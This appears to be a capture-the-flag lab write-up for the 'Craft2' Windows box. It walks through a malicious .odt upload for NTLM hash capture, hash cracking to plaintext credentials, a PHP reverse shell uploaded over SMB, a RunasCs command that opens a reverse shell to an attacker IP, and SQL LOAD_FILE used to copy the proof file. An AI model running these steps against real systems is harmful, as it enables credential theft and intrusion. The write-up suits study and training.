---
description: Think like a red teamer, not a CTF player. 🕵️‍♂️
icon: windows
---

# Craft2

## Summary

* Found a web app with `.odt` file upload functionality on port 80.
* Crafted a malicious `.odt` payload to capture NTLM hashes using Responder.
* Cracked the captured hash to get valid credentials: `thecybergeek : winniethepooh`.
* Gained shell access by uploading a PHP reverse shell via SMB.
* Used RunasCs to pivot between users and maintain access.
* Couldn’t escalate privileges directly, so leveraged SQL’s `LOAD_FILE()` to exfiltrate `proof.txt`.



## 🧵Let's Unpack

#### 🚪 Enumeration

🔹 **Nmap Full Scan**

```bash
nmap -p- -T5 192.168.216.188 -vv
```

🔹 **Targeted Port Scan**

```bash
sudo nmap -sC -sN -A -p 80,135,445,49666 192.168.216.188
```

* Web app running on port 80
* RPC and SMB (135, 445) open
* Unknown service on 49666
* Discovered domain `craft.offsec` and user `admin@craft.offsec`

***

#### 🌐 Web Application Enumeration (Port 80)

* Found upload functionality that accepted `.odt` files.
* Used `odt_badodt` payload via Metasploit to trigger NTLM auth leak.
*   Captured hash using `responder`:

    ```
    thecybergeek::CRAFT2:a569...:EA45...
    ```
* Cracked using `john` → `winniethepooh`

***

#### 📦 SMB Access

Verified credentials via CrackMapExec:

```bash
crackmapexec smb 192.168.216.188 -u 'thecybergeek' -p 'winniethepooh'
```

Discovered readable share: `WebApp`

Uploaded PHP reverse shell, caught with netcat.

***

### 🔓 Initial Foothold

* Uploaded reverse shell payload using SMB share access.
* Executed payload through browser to catch shell.
* Upgraded access with `RunasCs.exe` using captured creds:

```bash
RunasCs.exe thecybergeek winniethepooh cmd craft.offsec -r 192.168.45.198:9988 -b -i
```

***

### 📈 Privilege Escalation (Creative Alternative)

* Couldn’t escalate via WinPEAS or service misconfigs.
* Switched to clever SQL abuse using `LOAD_FILE()`:

```sql
SELECT LOAD_FILE("C:\\users\\administrator\\Desktop\\proof.txt") INTO DUMPFILE "C:\\xampp\\htdocs\\proof.txt";
```

* Retrieved proof without SYSTEM access 🎯

***

### 💡 Hints

* **Initial Foothold**: Try uploading a `.odt` file embedded with an external resource to capture NTLM hashes via Responder.
* **Privilege Escalation**: If you hit a wall, explore creative data exfiltration. Sometimes reading the `proof.txt` without SYSTEM is all it takes.

***
